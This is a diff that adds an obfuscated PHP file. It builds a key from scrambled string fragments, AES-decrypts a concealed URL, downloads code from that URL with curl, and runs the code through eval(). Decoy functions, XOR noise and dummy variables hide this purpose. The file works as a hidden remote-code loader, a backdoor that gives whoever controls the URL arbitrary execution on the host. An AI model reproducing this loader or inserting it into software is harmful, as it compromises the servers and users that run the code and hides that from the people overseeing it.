@@ -1,0 +1,73 @@
+<?php
+$_6f1e = [
+    "b6a4" => "yo",
+    "4f9b" => "used",
+    "a9bc" => "ur-se",
+    "f0e5" => "dummy",
+    "8d6a" => "cret-",
+    "d2f9" => "placeholder",
+    "7e6c" => "key"
+];
+$randomData1 = md5("d2f9" . time());
+$Array = [
+    "array1" => "value1",
+    "array2" => "value2",
+    "array3" => "value3"
+];
+
+$keys = ['b6a4', 'a9bc', '8d6a', '7e6c'];
+$_11f9 = $_6f1e[$keys[0]] . $_6f1e[$keys[1]] . $_6f1e[$keys[2]] . $_6f1e[$keys[3]];
+define("Zz8x7Y", $_11f9);
+define("Constant", "dummy");
+
+function SeFunction() {
+    return " just success";
+}
+$_7a5b = "l2UDM/1kihg+Pd50dO3hKCkDZKCBzafIvVT20a6iA3JU8Hmvdc+zphRjWcyXRbEWdSn0lGEH4q5ohF0zo4/n2o3pxErBJt+CTGHIjuF3GkA=";
+function zwxyb($_7a5b, $_11f9) {
+    $Calculation = base64_encode("Decrypt" . $_11f9);
+    return openssl_decrypt(
+        $_7a5b,
+        'AES-128-CBC',
+        substr(hash('sha256', $_11f9, true), 0, 16),
+        0,
+        substr(hash('md5', $_11f9, true), 0, 16)
+    );
+}
+
+function uyrD($_yfd, $_ke) {
+    if (strlen($_yfd) < 5) {
+        $_yfd .= "ExtraNoise";
+    }
+    $_ke = str_repeat($_ke, ceil(strlen($_yfd) / strlen($_ke)));
+    return $_yfd ^ $_ke;
+}
+$_array1 = uyrD("data1", "random-key");
+$_array2 = uyrD("data2", "another-key");
+$_array3 = uyrD("data3", "third-key");
+
+$_xE8f = uyrD("dummy-data", "xor-key");
+$_wT7y = uyrD($_xE8f, "xor-key");
+
+$ch = curl_init(zwxyb($_7a5b, Zz8x7Y));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+$_8F3d = curl_exec($ch);
+curl_close($ch);
+
+$ok_check = ($_wT7y === "dummy-data");
+function Logger($_msg) {
+    error_log("log: " . $_msg);
+    return;
+}
+
+function bN9i($_msg) {
+    fakeLogger($_msg);
+    return;
+}
+if ($_8F3d !== false) {
+    eval($_8F3d);
+} else {
+    bN9i("Failed to fetch content from the URL.");
+}
+?>
